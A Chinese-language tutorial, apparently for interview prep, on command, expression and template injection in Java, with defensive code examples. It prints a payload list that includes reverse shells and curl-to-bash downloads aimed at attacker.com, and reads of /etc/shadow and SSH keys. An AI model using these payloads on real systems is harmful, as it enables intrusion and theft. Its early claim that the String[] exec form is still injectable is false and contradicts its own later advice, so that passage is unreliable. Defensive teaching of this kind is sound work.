# 代码注入：系统命令的潘多拉魔盒

你的 Java 程序需要调用系统命令来ping一个服务器：

```java
String ip = request.getParameter("ip");
Runtime.getRuntime().exec("ping -c 3 " + ip);
```

正常输入：`8.8.8.8`
恶意输入：`8.8.8.8; rm -rf /`

服务器执行了 ping，然后又执行了删除命令。

这就是**代码注入（Code Injection）**——把用户输入当作代码执行。

## 代码注入的类型

### 1. 命令注入（Command Injection）

最常见，通过系统调用执行命令：

```java
// ❌ 危险：用户输入拼接到命令中
String ip = request.getParameter("ip");
Runtime.getRuntime().exec("ping -c 3 " + ip);

// 攻击者输入：8.8.8.8; cat /etc/passwd
// 实际执行：ping -c 3 8.8.8.8; cat /etc/passwd
```

```java
// ❌ 危险：使用 String[] 参数
String[] cmd = {"ping", "-c", "3", ip};
Runtime.getRuntime().exec(cmd);
// 如果 ip = "8.8.8.8; rm -rf /"
// 数组方式仍然危险
```

### 2. 表达式注入（Expression Injection）

通过 eval() 等机制执行代码：

```java
// ❌ 危险：动态执行代码
String expression = request.getParameter("expr");
// 用户输入：Runtime.getRuntime().exec("rm -rf /")
Object result = eval(expression);
```

```javascript
// Node.js
const expr = req.query.expr;
eval(`(${expr})`);  // 危险！
```

### 3. 模板注入（Template Injection）

通过模板引擎执行代码：

```python
# Jinja2 模板注入
template = Template("Hello " + user_input)
rendered = template.render()
```

```java
// Thymeleaf
// 用户输入：__${T(java.lang.Runtime).getRuntime().exec('rm -rf /')}__
<span th:text="${userInput}"></span>
```

## 命令注入的常见场景

```
┌─────────────────────────────────────────────────────────────┐
│                    常见命令注入场景                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. 网络诊断工具                                             │
│     ping, traceroute, nslookup                              │
│                                                             │
│  2. 文件操作                                                 │
│     cat, grep, diff                                        │
│                                                             │
│  3. 邮件处理                                                 │
│     sendmail, mail                                          │
│                                                             │
│  4. 文档转换                                                 │
│     pandoc, wkhtmltopdf, ImageMagick                       │
│                                                             │
│  5. Docker/Kubernetes 操作                                  │
│     docker exec, kubectl exec                               │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

## 命令注入的 Payload

```bash
# Unix/Linux 命令注入

# 链接命令
; whoami
& whoami
| whoami
&& whoami
|| whoami

# 管道输出
; cat /etc/passwd
| nc attacker.com 1234

# 后台执行
; nohup bash -i >& /dev/tcp/attacker.com/1234 0>&1 &

# 写入文件
; echo "hacked" > /var/www/html/shell.php

# 下载并执行
; curl https://attacker.com/shell.sh | bash

# 读取敏感文件
; cat /etc/shadow
; cat ~/.ssh/id_rsa

# 反弹 Shell
; bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

## 命令注入防御

### 1. 避免使用系统命令

```java
// ✅ 最佳方案：使用 Java 库替代系统命令

// ❌ 危险
Runtime.getRuntime().exec("ping -c 3 " + ip);

// ✅ 使用 Java 网络库
public class PingService {
    
    public boolean ping(String host) throws IOException {
        InetAddress address = InetAddress.getByName(host);
        return address.isReachable(5000);  // 5秒超时
    }
}

// ❌ 危险
Runtime.getRuntime().exec("nslookup " + domain);

// ✅ 使用 Java DNS
public class DnsLookup {
    
    public InetAddress[] lookup(String domain) throws UnknownHostException {
        return InetAddress.getAllByName(domain);
    }
}
```

### 2. 参数化命令执行

如果必须使用系统命令：

```java
// ✅ 使用数组方式，避免 shell 解析
String[] cmd = new String[]{
    "ping", "-c", "3", ip
};
Process process = Runtime.getRuntime().exec(cmd);

// ✅ ProcessBuilder 更安全
ProcessBuilder pb = new ProcessBuilder(
    "ping", "-c", "3", ip
);
pb.redirectErrorStream(true);
Process process = pb.start();

// ✅ 使用 security manager（Java 17+ 移除）
System.setSecurityManager(new SecurityManager() {
    @Override
    public void checkExec(String cmd) {
        throw new SecurityException("禁止执行外部命令");
    }
});
```

### 3. 输入验证

```java
@Service
public class InputValidator {
    
    /**
     * 验证 IP 地址
     */
    public boolean isValidIp(String ip) {
        if (ip == null || ip.isEmpty()) {
            return false;
        }
        
        // IP 地址格式验证
        String ipPattern = "^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}" +
                          "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$";
        
        return Pattern.matches(ipPattern, ip);
    }
    
    /**
     * 验证域名
     */
    public boolean isValidDomain(String domain) {
        if (domain == null || domain.isEmpty()) {
            return false;
        }
        
        // 域名格式验证
        String domainPattern = "^([a-zA-Z0-9]([a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?\\.)+" +
                               "[a-zA-Z]{2,}$";
        
        return Pattern.matches(domainPattern, domain);
    }
    
    /**
     * 通用命令注入防护：移除危险字符
     */
    public String sanitizeForCommand(String input) {
        if (input == null) {
            return "";
        }
        
        // 移除危险字符
        String sanitized = input
            .replace(";", "")
            .replace("&", "")
            .replace("|", "")
            .replace("`", "")
            .replace("$", "")
            .replace("(", "")
            .replace(")", "")
            .replace("<", "")
            .replace(">", "")
            .replace("\n", "")
            .replace("\r", "");
        
        return sanitized;
    }
}
```

### 4. 沙箱执行

```java
@Service
public class SandboxedCommandExecutor {
    
    private static final Set<String> ALLOWED_COMMANDS = Set.of(
        "ping", "nslookup", "traceroute"
    );
    
    /**
     * 白名单命令执行
     */
    public String execute(String command, List<String> args) throws IOException {
        // 验证命令在白名单中
        if (!ALLOWED_COMMANDS.contains(command)) {
            throw new SecurityException("不允许执行该命令");
        }
        
        // 构建安全的命令数组
        List<String> cmdList = new ArrayList<>();
        cmdList.add(command);
        cmdList.addAll(args);
        
        // 设置环境限制
        ProcessBuilder pb = new ProcessBuilder(cmdList);
        
        // 限制工作目录
        pb.directory(new File("/tmp"));
        
        // 限制执行时间
        pb.redirectErrorStream(true);
        
        Process process = pb.start();
        
        // 读取输出（限制大小，防止 DoS）
        try (BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream()))) {
            
            StringBuilder output = new StringBuilder();
            String line;
            int lineCount = 0;
            int maxLines = 1000;
            
            while ((line = reader.readLine()) != null && lineCount++ < maxLines) {
                output.append(line).append("\n");
            }
            
            // 等待进程结束
            boolean finished = process.waitFor(10, TimeUnit.SECONDS);
            if (!finished) {
                process.destroyForcibly();
                throw new SecurityException("命令执行超时");
            }
            
            return output.toString();
        }
    }
}
```

## 代码注入 vs 命令注入

| | 命令注入 | 代码注入 |
|--|---------|---------|
| 注入位置 | OS 命令行 | 应用程序代码 |
| 目标 | 执行系统命令 | 执行应用代码 |
| 危险函数 | Runtime.exec(), ProcessBuilder | eval(), exec() |
| 防御 | 避免命令调用、参数化 | 避免动态执行代码 |

## 模板注入防护

```java
// Thymeleaf 安全使用
@Service
public class SafeTemplateService {
    
    /**
     * 安全渲染模板：使用 Thymeleaf 标准语法
     */
    public String render(String templateName, Map<String, Object> data) {
        // 只使用预定义的模板名
        if (!isAllowedTemplate(templateName)) {
            throw new SecurityException("不允许的模板");
        }
        
        // 不使用用户输入作为模板
        Context context = new Context();
        data.forEach(context::setVariable);
        
        return templateEngine.process(templateName, context);
    }
    
    private boolean isAllowedTemplate(String name) {
        Set<String> allowed = Set.of("welcome", "user-profile", "product-detail");
        return allowed.contains(name);
    }
}
```

## 面试追问方向

1. **代码注入和 SQL 注入的区别？** —— SQL 注入在数据库层，代码注入在应用层或系统层；代码注入可以执行任意系统命令
2. **为什么 ProcessBuilder 比 Runtime.exec() 更安全？** —— ProcessBuilder 避免 shell 解析，但两者都需参数化
3. **禁用 shell 解析能防命令注入吗？** —— 大部分能，但如果命令本身危险仍可执行
4. **什么情况下必须使用系统命令？** —— 尽量不使用；Java 库能完成的功能都不用命令
5. **模板注入的原理？** —— 用户输入被当作模板代码解析执行，需要严格控制模板来源

> "代码注入是最危险的漏洞之一。永远不要把用户输入拼接到任何可执行的上下文中。"
